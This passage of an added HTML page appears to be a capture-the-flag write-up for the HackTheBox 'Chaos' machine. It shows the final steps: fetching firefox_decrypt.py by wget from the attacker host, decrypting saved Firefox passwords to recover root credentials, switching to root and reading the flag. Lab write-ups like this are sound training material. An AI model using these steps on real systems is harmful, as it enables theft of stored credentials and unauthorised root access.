+                &lt;ox$&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.13.44<span style="color:#ff9d00;font-weight:700">:</span>8000<span style="color:#ff9d00;font-weight:700">/</span>firefox_decrypt.py<br>
+                --2019-05-18&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>34<span style="color:#ff9d00;font-weight:700">:</span>27--&nbsp;&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.13.44<span style="color:#ff9d00;font-weight:700">:</span>8000<span style="color:#ff9d00;font-weight:700">/</span>firefox_decrypt.py<br>
+                Connecting&nbsp;to&nbsp;10.10.13.44<span style="color:#ff9d00;font-weight:700">:</span>8000...&nbsp;connected.<br>
+                HTTP&nbsp;request&nbsp;sent,&nbsp;awaiting&nbsp;response...&nbsp;200&nbsp;OK<br>
+                Length<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;34618&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>34K<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[text<span style="color:#ff9d00;font-weight:700">/</span>plain]<br>
+                Saving&nbsp;to<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;‘firefox_decrypt.py’<br>
+                <br>
+                firefox_decrypt.py&nbsp;&nbsp;100%[===================&gt;]&nbsp;&nbsp;33.81K&nbsp;&nbsp;&nbsp;146KB<span style="color:#ff9d00;font-weight:700">/</span>s&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;0.2s&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                <br>
+                2019-05-18&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>34<span style="color:#ff9d00;font-weight:700">:</span>27&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>146&nbsp;KB<span style="color:#ff9d00;font-weight:700">/</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;‘firefox_decrypt.py’&nbsp;saved&nbsp;[34618<span style="color:#ff9d00;font-weight:700">/</span>34618]
+            </div>
+        </div><br>
+        <br>
+        Run firefox_decrypt.py:<br>
+            <div class="codebox">
+                ayush@chaos<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>.mozilla<span style="color:#ff9d00;font-weight:700">/</span>firefox$&nbsp;python3&nbsp;firefox_decrypt.py<br>
+                <br>
+                Master&nbsp;Password&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">profile</span>&nbsp;/home/ayush/.mozilla/firefox/bzo7sjt1.default:&nbsp;jiujitsu<br>
+                <br>
+                <br>
+                Website:&nbsp;&nbsp;&nbsp;https://chaos.htb:10000<br>
+                Username:&nbsp;'root'<br>
+                Password:&nbsp;'Thiv8wrej~'
+            </div>
+        </div><br>
+        <br>
+        Remove the script so you don't spoil the game for others:<br>
+            <div class="codebox">
+                ayush@chaos<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>.mozilla<span style="color:#ff9d00;font-weight:700">/</span>firefox$&nbsp;<span style="color:#ff9d00;font-weight:700">rm</span>&nbsp;firefox_decrypt.py
+            </div>
+        </div><br>
+        <br>
+        And check if this root password works?<br>
+            <div class="codebox">
+                ayush@chaos<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>.mozilla<span style="color:#ff9d00;font-weight:700">/</span>firefox$&nbsp;<span style="color:#ff9d00;font-weight:700">su</span>&nbsp;root<br>
+                Password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Thiv8wrej~<br>
+                <br>
+                root@chaos<span style="color:#ff9d00;font-weight:700">:/</span>home<span style="color:#ff9d00;font-weight:700">/</span>ayush<span style="color:#ff9d00;font-weight:700">/</span>.mozilla<span style="color:#ff9d00;font-weight:700">/</span>firefox#
+            </div>
+        </div><br>
+        <br>
+        Nice :)<br>
+            <div class="codebox">
+                root@chaos<span style="color:#ff9d00;font-weight:700">:/</span>home<span style="color:#ff9d00;font-weight:700">/</span>ayush<span style="color:#ff9d00;font-weight:700">/</span>.mozilla<span style="color:#ff9d00;font-weight:700">/</span>firefox#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;~&nbsp;&nbsp;&nbsp;<br>
+                root@chaos<span style="color:#ff9d00;font-weight:700">:</span>~#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                root.txt<br>
+                root@chaos<span style="color:#ff9d00;font-weight:700">:</span>~#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;root.txt<br>
+                4eca7...
+            </div>
+        </div><br>
+    </writeup>
+</section>
+
+</body>
+</html>
